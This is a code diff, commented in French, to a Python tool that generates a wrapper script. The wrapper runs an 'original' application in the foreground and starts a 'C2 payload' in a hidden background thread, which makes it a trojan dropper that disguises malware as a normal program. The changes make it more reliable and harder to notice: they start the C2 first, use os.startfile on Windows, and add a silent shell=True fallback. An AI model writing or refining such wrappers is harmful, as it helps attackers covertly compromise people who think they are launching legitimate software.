@@ -317,9 +317,18 @@ def run_original_app():
     """Lance l'application originale"""
     try:
         if original_app.exists():
-            subprocess.Popen([str(original_app)], shell=False)
+            # Sur Windows, utiliser os.startfile pour les .exe (meilleur support)
+            if sys.platform.startswith('win'):
+                os.startfile(str(original_app))
+            else:
+                # macOS/Linux: utiliser subprocess
+                subprocess.Popen([str(original_app)], shell=False)
     except Exception as e:
-        pass
+        # Fallback: essayer avec shell=True
+        try:
+            subprocess.Popen([str(original_app)], shell=True)
+        except:
+            pass
 
 def run_c2_payload():
     """Lance le payload C2 en arrière-plan"""
@@ -332,16 +341,12 @@ def run_c2_payload():
         pass
 
 if __name__ == "__main__":
-    # Lancer l'app originale dans un thread
-    original_thread = threading.Thread(target=run_original_app, daemon=False)
-    original_thread.start()
-    
-    # Lancer le C2 en arrière-plan
+    # Lancer le C2 immédiatement en arrière-plan (daemon)
     c2_thread = threading.Thread(target=run_c2_payload, daemon=True)
     c2_thread.start()
     
-    # Attendre que l'app originale termine
-    original_thread.join()
+    # Lancer l'app originale (non-daemon pour que le process reste actif)
+    run_original_app()
 '''
 
         return wrapper
